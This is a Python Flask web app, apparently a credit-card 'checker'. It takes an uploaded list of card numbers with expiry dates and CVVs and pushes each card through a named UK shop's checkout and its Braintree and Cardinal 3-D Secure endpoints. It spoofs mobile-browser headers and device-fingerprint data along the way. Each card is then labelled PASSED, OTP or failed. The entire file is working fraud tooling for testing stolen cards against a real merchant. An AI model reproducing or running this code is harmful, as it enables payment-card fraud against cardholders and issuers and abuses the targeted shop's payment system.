from flask import Flask, render_template, request, jsonify
import requests, random, string, bs4, base64
from bs4 import *
import time, uuid, json, re, jwt
import os
import threading

app = Flask(__name__)
app.secret_key = 'your_secret_key_here'

# حالة المعالجة
processing_status = {
    'active': False,
    'current': 0,
    'total': 0,
    'passed': 0,
    'failed': 0,
    'otp': 0,
    'current_card': '',
    'log': []
}

def process_cc_file(file_content, tokbot, idbot):
    global processing_status
    
    try:
        lines = file_content.strip().split('\n')
        
        processing_status['total'] = len(lines)
        processing_status['active'] = True
        
        r = requests.Session()
        
        for start_num, P in enumerate(lines, 1):
            if not processing_status['active']:
                break
                
            P = P.strip()
            if not P:
                continue
                
            processing_status['current'] = start_num
            processing_status['current_card'] = P
            
            try:
                n = P.split('|')[0]
                mm = P.split('|')[1]
                yy = P.split('|')[2][-2:]
                cvc = P.split('|')[3].replace('\n', '')
                
                # تنظيف السلة
                clear_url = "https://southenddogtraining.co.uk/wp-json/cocart/v2/cart/clear"
                clear_resp = r.post(clear_url)
                
                # إضافة عنصر إلى السلة
                headers = {
                    'authority': 'southenddogtraining.co.uk',
                    'accept': '*/*',
                    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                    'cache-control': 'no-cache',
                    'content-type': 'application/json',
                    'origin': 'https://southenddogtraining.co.uk',
                    'pragma': 'no-cache',
                    'referer': 'https://southenddogtraining.co.uk/shop/cold-pressed-dog-food/cold-pressed-sample/',
                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                }
                
                json_data = {'id': '123368', 'quantity': '1'}
                
                response = r.post(
                    'https://southenddogtraining.co.uk/wp-json/cocart/v2/cart/add-item',
                    headers=headers,
                    json=json_data,
                )
                
                cart_hash = response.json()['cart_hash']
                
                cookies = {
                    'clear_user_data': 'true',
                    'woocommerce_items_in_cart': '1',
                    'woocommerce_cart_hash': cart_hash,
                    'pmpro_visit': '1',
                }
                
                headers = {
                    'authority': 'southenddogtraining.co.uk',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                    'cache-control': 'no-cache',
                    'pragma': 'no-cache',
                    'referer': 'https://southenddogtraining.co.uk/shop/cold-pressed-dog-food/cold-pressed-sample/',
                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                }
                
                response = r.get('https://southenddogtraining.co.uk/checkout/', cookies=cookies, headers=headers)
                client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
                add_nonce = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)
                
                headers = {
                    'authority': 'southenddogtraining.co.uk',
                    'accept': '*/*',
                    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                    'cache-control': 'no-cache',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://southenddogtraining.co.uk',
                    'pragma': 'no-cache',
                    'referer': 'https://southenddogtraining.co.uk/checkout/',
                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                }
                
                data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client}
                
                response = r.post(
                    'https://southenddogtraining.co.uk/cms/wp-admin/admin-ajax.php',
                    cookies=cookies,
                    headers=headers,
                    data=data,
                )
                
                enc = response.json()['data']
                dec = base64.b64decode(enc).decode('utf-8')
                au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
                
                headers = {
                    'authority': 'payments.braintree-api.com',
                    'accept': '*/*',
                    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                    'authorization': f'Bearer {au}',
                    'braintree-version': '2018-05-10',
                    'cache-control': 'no-cache',
                    'content-type': 'application/json',
                    'origin': 'https://southenddogtraining.co.uk',
                    'pragma': 'no-cache',
                    'referer': 'https://southenddogtraining.co.uk/',
                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                }
                
                json_data = {
                    'clientSdkMetadata': {
                        'source': 'client',
                        'integration': 'custom',
                        'sessionId': '6f25ee04-0384-46dc-9413-222fa62fc552',
                    },
                    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
                    'operationName': 'ClientConfiguration',
                }
                
                response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
                car = response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
                
                headers = {
                    'authority': 'centinelapi.cardinalcommerce.com',
                    'accept': '*/*',
                    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                    'cache-control': 'no-cache',
                    'content-type': 'application/json;charset=UTF-8',
                    'origin': 'https://southenddogtraining.co.uk',
                    'pragma': 'no-cache',
                    'referer': 'https://southenddogtraining.co.uk/',
                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                    'x-cardinal-tid': 'Tid-9485656a-80d9-4fb0-9090-5f1a55b0d87a',
                }
                
                json_data = {
                    'BrowserPayload': {
                        'Order': {
                            'OrderDetails': {},
                            'Consumer': {
                                'BillingAddress': {},
                                'ShippingAddress': {},
                                'Account': {},
                            },
                            'Cart': [],
                            'Token': {},
                            'Authorization': {},
                            'Options': {},
                            'CCAExtension': {},
                        },
                        'SupportsAlternativePayments': {
                            'cca': True,
                            'hostedFields': False,
                            'applepay': False,
                            'discoverwallet': False,
                            'wallet': False,
                            'paypal': False,
                            'visacheckout': False,
                        },
                    },
                    'Client': {
                        'Agent': 'SongbirdJS',
                        'Version': '1.35.0',
                    },
                    'ConsumerSessionId': '1_51ec1382-5c25-4ae8-8140-d009e9a0ba7e',
                    'ServerJWT': car,
                }
                
                response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
                payload = response.json()['CardinalJWT']
                ali2 = jwt.decode(payload, options={"verify_signature": False})
                reid = ali2['ReferenceId']
                
                headers = {
                    'authority': 'geo.cardinalcommerce.com',
                    'accept': '*/*',
                    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                    'cache-control': 'no-cache',
                    'content-type': 'application/json',
                    'origin': 'https://geo.cardinalcommerce.com',
                    'pragma': 'no-cache',
                    'referer': 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=685f36f8a9cda83f2eeb2dff&tmEventType=PAYMENT&referenceId=1_51ec1382-5c25-4ae8-8140-d009e9a0ba7e&geolocation=false&origin=Songbird',
                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                }
                
                json_data = {
                    'Cookies': {
                        'Legacy': True,
                        'LocalStorage': True,
                        'SessionStorage': True,
                    },
                    'DeviceChannel': 'Browser',
                    'Extended': {
                        'Browser': {
                            'Adblock': True,
                            'AvailableJsFonts': [],
                            'DoNotTrack': 'unknown',
                            'JavaEnabled': False,
                        },
                        'Device': {
                            'ColorDepth': 24,
                            'Cpu': 'unknown',
                            'Platform': 'Linux armv81',
                            'TouchSupport': {
                                'MaxTouchPoints': 5,
                                'OnTouchStartAvailable': True,
                                'TouchEventCreationSuccessful': True,
                            },
                        },
                    },
                    'Fingerprint': '1224948465f50bd65545677bc5d13675',
                    'FingerprintingTime': 980,
                    'FingerprintDetails': {
                        'Version': '1.5.1',
                    },
                    'Language': 'ar-EG',
                    'Latitude': None,
                    'Longitude': None,
                    'OrgUnitId': '685f36f8a9cda83f2eeb2dff',
                    'Origin': 'Songbird',
                    'Plugins': [],
                    'ReferenceId': reid,
                    'Referrer': 'https://southenddogtraining.co.uk/',
                    'Screen': {
                        'FakedResolution': False,
                        'Ratio': 2.2222222222222223,
                        'Resolution': '800x360',
                        'UsableResolution': '800x360',
                        'CCAScreenSize': '01',
                    },
                    'CallSignEnabled': None,
                    'ThreatMetrixEnabled': False,
                    'ThreatMetrixEventType': 'PAYMENT',
                    'ThreatMetrixAlias': 'Default',
                    'TimeOffset': -180,
                    'UserAgent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                    'UserAgentDetails': {
                        'FakedOS': False,
                        'FakedBrowser': False,
                    },
                    'BinSessionId': '09f2dd83-a00a-42d5-9d89-f2867589860b',
                }
                
                response = r.post(
                    'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
                    cookies=r.cookies,
                    headers=headers,
                    json=json_data,
                )
                
                headers = {
                    'authority': 'payments.braintree-api.com',
                    'accept': '*/*',
                    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                    'authorization': f'Bearer {au}',
                    'braintree-version': '2018-05-10',
                    'cache-control': 'no-cache',
                    'content-type': 'application/json',
                    'origin': 'https://assets.braintreegateway.com',
                    'pragma': 'no-cache',
                    'referer': 'https://assets.braintreegateway.com/',
                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                }
                
                json_data = {
                    'clientSdkMetadata': {
                        'source': 'client',
                        'integration': 'custom',
                        'sessionId': 'd118f7da-b7b0-4b4e-847a-c81bc63dad77',
                    },
                    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                    'variables': {
                        'input': {
                            'creditCard': {
                                'number': n,
                                'expirationMonth': mm,
                                'expirationYear': yy,
                                'cvv': cvc,
                            },
                            'options': {
                                'validate': False,
                            },
                        },
                    },
                    'operationName': 'TokenizeCreditCard',
                }
                
                response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
                tok = response.json()['data']['tokenizeCreditCard']['token']
                binn = response.json()['data']['tokenizeCreditCard']['creditCard']['bin']
                
                headers = {
                    'authority': 'api.braintreegateway.com',
                    'accept': '*/*',
                    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                    'cache-control': 'no-cache',
                    'content-type': 'application/json',
                    'origin': 'https://southenddogtraining.co.uk',
                    'pragma': 'no-cache',
                    'referer': 'https://southenddogtraining.co.uk/',
                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                }
                
                json_data = {
                    'amount': '2.99',
                    'additionalInfo': {},
                    'bin': binn,
                    'dfReferenceId': reid,
                    'clientMetadata': {
                        'requestedThreeDSecureVersion': '2',
                        'sdkVersion': 'web/3.94.0',
                        'cardinalDeviceDataCollectionTimeElapsed': 51,
                        'issuerDeviceDataCollectionTimeElapsed': 2812,
                        'issuerDeviceDataCollectionResult': True,
                    },
                    'authorizationFingerprint': au,
                    'braintreeLibraryVersion': 'braintree/web/3.94.0',
                    '_meta': {
                        'merchantAppId': 'southenddogtraining.co.uk',
                        'platform': 'web',
                        'sdkVersion': '3.94.0',
                        'source': 'client',
                        'integration': 'custom',
                        'integrationType': 'custom',
                        'sessionId': 'e0de4acd-a40f-46fd-9f4b-ae49eb1ff65f',
                    },
                }
                
                response = r.post(
                    f'https://api.braintreegateway.com/merchants/twtsckjpfh6g4qqg/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
                    headers=headers,
                    json=json_data,
                )
                
                vbv = response.json()['paymentMethod']['threeDSecureInfo']['status']
                
                if 'authenticate_successful' in vbv or 'authenticate_attempt_successful' in vbv:
                    processing_status['passed'] += 1
                    log_msg = f'[{start_num}] {P} | PASSED ✅'
                    processing_status['log'].append(log_msg)
                    
                elif 'challenge_required' in vbv:
                    processing_status['otp'] += 1
                    log_msg = f'[{start_num}] {P} | OTP ☑️'
                    processing_status['log'].append(log_msg)
                    
                else:
                    processing_status['failed'] += 1
                    log_msg = f'[{start_num}] {P} | {vbv}'
                    processing_status['log'].append(log_msg)
                
                time.sleep(5)
                
            except Exception as e:
                processing_status['failed'] += 1
                log_msg = f'[{start_num}] {P} | ERROR: {str(e)}'
                processing_status['log'].append(log_msg)
        
        processing_status['active'] = False
        
    except Exception as e:
        processing_status['active'] = False
        processing_status['log'].append(f'Fatal error: {str(e)}')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload_file():
    global processing_status
    
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'})
    
    file = request.files['file']
    tokbot = request.form.get('tokbot', '')
    idbot = request.form.get('idbot', '')
    
    if file.filename == '':
        return jsonify({'error': 'No file selected'})
    
    if file:
        file_content = file.read().decode('utf-8')
        
        # إعادة تعيين حالة المعالجة
        processing_status = {
            'active': True,
            'current': 0,
            'total': 0,
            'passed': 0,
            'failed': 0,
            'otp': 0,
            'current_card': '',
            'log': []
        }
        
        # بدء المعالجة في خيط منفصل
        thread = threading.Thread(target=process_cc_file, args=(file_content, tokbot, idbot))
        thread.start()
        
        return jsonify({'message': 'File uploaded and processing started'})

@app.route('/status')
def get_status():
    return jsonify(processing_status)

@app.route('/stop', methods=['POST'])
def stop_processing():
    processing_status['active'] = False
    return jsonify({'message': 'Processing stopped'})

@app.route('/results')
def get_results():
    # إرجاع النتائج كاستجابة JSON
    return jsonify({
        'log': processing_status['log'],
        'passed': processing_status['passed'],
        'failed': processing_status['failed'],
        'otp': processing_status['otp'],
        'total': processing_status['total']
    })

if __name__ == '__main__':
    app.run(debug=True)
